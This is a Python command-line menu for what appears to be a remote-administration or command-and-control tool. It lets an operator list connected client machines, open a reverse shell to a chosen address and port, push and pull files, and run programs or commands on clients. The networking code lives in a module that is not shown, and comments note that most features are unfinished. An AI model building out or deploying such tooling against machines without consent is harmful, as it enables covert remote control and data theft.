#!/usr/bin/python3
from front import admin


stayInProgram=True
res=False
commands = ['help','listClients','popShell', 'sendFile', 'reciveFile', 'execProgram','runComand', 'testServer', 'testClient','exit']

exit = len(commands) - 1

master=admin()

while stayInProgram :
    wait = True
    print (
        "List of commands:" + "\n\n" +
        "0 - help" + "\n" +
        "1 - listClients" +  "\n" +
        "2 - popShell"  + "\n" +
        "3 - sendFile"  + "\n" +
        "4 - reciveFile"  + "\n" +
        "5 - execProgram" +  "\n" +
        "6 - runComand"  + "\n" +
        "7 - testServer"  + "\n" +
        "8 - testClient"  + "\n" +
        "9 - exit"  + "\n"
    )
    command = exit;

    try : 
        command = int(input('Enter the number of command:'))
        if (command<0) or (command>exit):
            raise command
    except:
        print("The input is not validated\n")
        command = exit


    print ("The command selected is: " + commands[command])

    if (command == 0): #help
        print (
        "\n\nThe program is an administrator of several computers that act as clients of the server where that program is run."  + "\n\n" +
        "0 - help: describe the program and the commands of program " "\n\n" +
        "1 - listClients: list full clients." + "\n\n" + 
        "2 - popShell: runs a reverse shell." + "\n\n" + 
        "3 - sendFile: send a file to the client." + "\n\n" + 
        "4 - reciveFile: pull file from client." + "\n\n" + 
        "5 - execProgram: executable runs on the client machine." + "\n\n" + 
        "6 - runComand: run a command on the client machine."  + "\n\n" +
        "7 - testServer: tests the connection to the server."  + "\n\n" +
        "8 - testClient: tests the connection on the client machine."  + "\n\n" +
        "9 - exit: disconnects of the server."  + "\n"
    )

    elif (command == 1): #listClients
        try:
            if not (master.displayClients()):
               raise master
        except:
            print("Returned Error!!")

    
    elif (command == 2): #popShell
        try:
            if not (master.displayClients()):
                raise master

            client = int(input("What client?"))
            print("\n")
            addres = input("what address?")
            print("\n")
            port = int(input("What port?"))
            print("\n")

            if not (master.abrirShell(client,addres,port)):
                raise master
        except:
            print("Returned Error!!")

    elif (command == 3): #sendFile
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")
            file = input("what file?")
            print("\n")

            if not (master.sendFile(file,client)):
                raise master
        except:
            print("Returned Error!!")


    elif (command == 4): #reciveFile
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")
            file = input("what file?")
            print("\n")

            if not (master.downloadFile(file,client)):
                raise master
        except:
            print("Returned Error!!")


    elif (command == 5): #execProgram
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")
            program = input("what file?")
            print("\n")

            if not (master.executeProgram(program,client)):
                raise master
        except:
            print("Returned Error!!")


    elif (command == 6): #runComand
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")
            comd = input("what command?")
            print("\n")

            if not (master.executeProgram(comd,client)):
                raise master
        except:
            print("Returned Error!!")
    
    elif (command == 7): #testServer
        try:
            if not(master.testServer()):
                raise master
        except:
            print("Returned Error!!")
    
    elif (command == 8): #testClient
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")

            if not(master.testClient()):
                raise master
        except:
            print("Returned Error!!")

    elif (command == exit): #exit
        stayInProgram = False
        wait = False
    
    else : #comando não descrito, nao deveria acontecer
        stayInProgram = False
        wait = False

    if (wait):
        input("\nPress enter for the next command")
        wait = False
    else:
        print("Finish the program")


#{listClients:ok,popShell:no,sendFile:no,reciveFile:no,execProgram:no,install:no,runComand:no,testServer:ok,testeClient:ok}
#lC:ok,pS:n,sF:n,rF:n,eP:n,i:n,rC:n,tS:ok,tC:ok